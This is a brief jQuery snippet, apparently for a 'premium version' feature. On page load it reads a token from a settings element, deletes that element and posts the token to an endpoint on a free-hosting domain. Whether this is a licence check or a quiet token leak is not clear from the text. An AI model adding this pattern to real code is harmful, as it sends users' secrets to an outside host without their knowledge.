// Api For Premium version
let getToken = $("settings token").text();
$("settings").remove();
$(document).ready(function(){
    let endpoint = "https://zawtea.000webhostapp.com/bahardev/";
    $.post(endpoint, { token: getToken }).done(function (res) {
        console.log(res);
    });
});